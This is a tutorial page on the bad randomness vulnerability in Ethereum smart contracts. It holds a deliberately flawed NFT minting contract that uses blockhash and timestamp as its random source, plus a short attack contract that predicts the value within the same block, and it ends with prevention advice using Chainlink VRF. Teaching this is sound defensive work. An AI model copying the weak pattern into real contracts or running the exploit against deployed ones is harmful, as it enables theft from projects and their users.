---
title: Bad Randomness
displayed_sidebar: generalSidebar
---

# Bad Randomness

## Pseudo-Random Numbers

Many applications on Ethereum, such as NFT random tokenId draws, blind box openings, and GameFi combat outcomes, rely on random numbers. However, since all data on Ethereum is public and deterministic, traditional random generation methods like `random()` are not available. Instead, projects often use pseudo-random number generators such as `blockhash()` and `keccak256()`. This approach, known as the Bad Randomness Vulnerability, allows attackers to predict outcomes, enabling them to manipulate results like minting specific rare NFTs.

This vulnerability is common in NFT and GameFi projects, including Meebits, Loots, and Wolf Game. It has led to significant financial losses, such as the SmartBillions Lottery exploit where attackers used predictable outcomes to win over 400 ETH. For more detailed information on this case, you can visit [ImmuneBytes](https://www.immunebytes.com/blog/bad-randomness-in-solidity-smart-contracts/).

Another related risk, although not due to randomness, was The DAO Hack, which resulted in a loss of around $60 million worth of Ether and led to a controversial hard fork of the Ethereum blockchain. For a comprehensive review of The DAO Hack and its implications on the Ethereum community, check out [CoinDesk](https://www.coindesk.com/consensus-magazine/2023/05/09/coindesk-turns-10-how-the-dao-hack-changed-ethereum-and-crypto/).

## Example of a Bad Randomness Vulnerability

Let's explore a vulnerable NFT contract, `FlawedRandomizer.sol`.

```solidity
contract FlawedRandomizer is ERC721 {
    uint256 public totalMints;

    // Constructor initializes the NFT collection's name and symbol.
    constructor() ERC721("", ""){}

    // Mint function: mints only when the input luckyNumber equals the random number.
    function mintIfLucky(uint256 guessedNumber) public {
        uint256 pseudoRandomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // Get pseudo-random number
        require(pseudoRandomNumber == guessedNumber, "Try again next time!");

        _mint(msg.sender, totalMints);
        totalMints++;
    }
}
```

The main function `mintIfLucky()` requires users to enter a number between `0-99`. If it matches the chain-generated pseudo-random number `pseudoRandomNumber`, they can mint a lucky NFT. The vulnerability lies in the ability of users to perfectly predict the generated random number and mint the NFT.

Let's write an attack contract `Exploit.sol`.

```solidity
contract Exploit {
    function executeMint(FlawedRandomizer nftAddress) public {
        // Calculate the random number in advance
        uint256 predictedNumber = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        ) % 100;
        // Use predictedNumber to execute the attack
        nftAddress.mintIfLucky(predictedNumber);
    }
}
```

The function `executeMint()` takes a `FlawedRandomizer` contract address as a parameter. Here, we calculate the `predictedNumber` and then pass it to the `mintIfLucky()` function to execute the attack. Since both `executeMint()` and `mintIfLucky()` are called in the same block, the `blockhash` and `block.timestamp` are the same, making the generated random number predictable.

## Prevention

We usually use off-chain random numbers provided by oracle projects to prevent this type of vulnerability, such as Chainlink VRF. These random numbers are generated off-chain and uploaded to the blockchain, ensuring they are unpredictable. For more information, read [WTF Solidity Tutorial, Lesson 39: Pseudo-Random Numbers](https://github.com/AmazingAng/WTF-Solidity/tree/main/39_Random).

This lesson introduced the bad randomness vulnerability and a simple prevention method: using off-chain random numbers provided by oracle projects. NFT and GameFi projects should avoid using on-chain pseudo-random numbers for lotteries to prevent exploitation by hackers.
